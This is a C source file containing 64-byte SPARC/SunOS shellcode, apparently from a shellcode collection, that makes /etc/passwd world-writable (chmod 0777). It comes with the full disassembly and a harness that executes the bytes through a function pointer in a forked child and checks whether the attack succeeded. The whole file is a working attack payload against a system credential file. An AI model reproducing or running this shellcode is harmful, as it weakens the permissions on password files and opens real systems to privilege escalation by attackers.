#include <fcntl.h>
#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "regs/state.h"

/*
 * SunOS (Solaris) / (sun4u / sparc32) sys_chmod("/etc/passwd", 0777)
 * 64 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@galactic.demon.co.uk>
 *
 * Tested on: SunOS leviathan 5.6 Generic_105181-30 sun4u sparc SUNW.Ultra-1
 *
 * Disassembly of section .text:
 *
 * 00010074 <_start>:
 * 10074:   90 10 20 c0     mov  0xc0, %o0
 * 10078:   90 22 20 c0     sub  %o0, 0xc0, %o0
 * 1007c:   d0 23 bf fc     st  %o0, [ %sp + -4 ]
 * 10080:   11 0b cb d9     sethi  %hi(0x2f2f6400), %o0
 * 10084:   90 12 21 74     or  %o0, 0x174, %o0 ! 2f2f6574 <_end+0x2f2d64bc>
 * 10088:   d0 23 bf f0     st  %o0, [ %sp + -16 ]
 * 1008c:   11 18 cb dc     sethi  %hi(0x632f7000), %o0
 * 10090:   90 12 20 61     or  %o0, 0x61, %o0  ! 632f7061 <_end+0x632d6fa9>
 * 10094:   d0 23 bf f4     st  %o0, [ %sp + -12 ]
 * 10098:   11 1c dc dd     sethi  %hi(0x73737400), %o0
 * 1009c:   90 12 23 64     or  %o0, 0x364, %o0 ! 73737764 <_end+0x737176ac>
 * 100a0:   d0 23 bf f8     st  %o0, [ %sp + -8 ]
 * 100a4:   90 23 a0 10     sub  %sp, 0x10, %o0
 * 100a8:   92 10 21 ff     mov  0x1ff, %o1
 * 100ac:   82 10 20 0f     mov  0xf, %g1
 * 100b0:   91 d0 20 10     ta  0x10
 */

#ifndef __sect_shellcode
#define __sect_shellcode __attribute__((section(".sect.shellcode")))
#endif

#ifndef __cold
#define __cold __attribute__((cold))
#endif

#ifndef __unvalidate_cfi
#define __unvalidate_cfi
#endif

#ifndef __unsafe
#define __unsafe __sect_shellcode __cold __unvalidate_cfi
#endif

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef __victim_path
#define __victim_path "/etc/passwd"
#endif

static char *shellcode = "\x90\x10\x20\xc0\x90\x22\x20\xc0"
                         "\xd0\x23\xbf\xfc\x11\x0b\xcb\xd9"
                         "\x90\x12\x21\x74\xd0\x23\xbf\xf0"
                         "\x11\x18\xcb\xdc\x90\x12\x20\x61"
                         "\xd0\x23\xbf\xf4\x11\x1c\xdc\xdd"
                         "\x90\x12\x23\x64\xd0\x23\xbf\xf8"
                         "\x90\x23\xa0\x10\x92\x10\x21\xff"
                         "\x82\x10\x20\x0f\x91\xd0\x20\x10";

int __unsafe main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int fd, ret, wstatus;
  pid_t pid;
  struct stat st;
  struct utsname uts;

  // add 2 unused parameters to make
  // %fp register properly aligned.
  void (*trigger)(int a, int b);

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    goto __fallback;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  trigger = (void (*)(int, int))shellcode;

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  pid = fork();

  if (pid < 0) {
    perror("fork()");
    ret = pid;
    goto __fallback;
  }

  if (!pid) {
    printf("[*] Executing the shellcode..\n");
    trigger(0, 0);
  } else {
    waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
  }

  if ((fd = open(__victim_path, O_RDONLY)) < 0) {
    perror("open()");
    ret = fd;
    goto __must_restore_regs;
  }

  if ((ret = fsync(fd)) < 0) {
    perror("fsync()");
    goto __must_close;
  }

  bzero(&st, sizeof(struct stat));

  if ((ret = fstat(fd, &st)) < 0) {
    perror("fstat()");
    goto __must_close;
  }

  if ((st.st_mode & 0xfff) != 0777) {
    printf(" [-] Fail.\n");
    goto __must_close;
  }

  printf(" [*] Success.\n");

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  close(fd);
  return 0;

__must_close:
  close(fd);

__must_restore_regs:
  store_regs(&__serialize_regs(cregs));

__fallback:
  return ret;
}
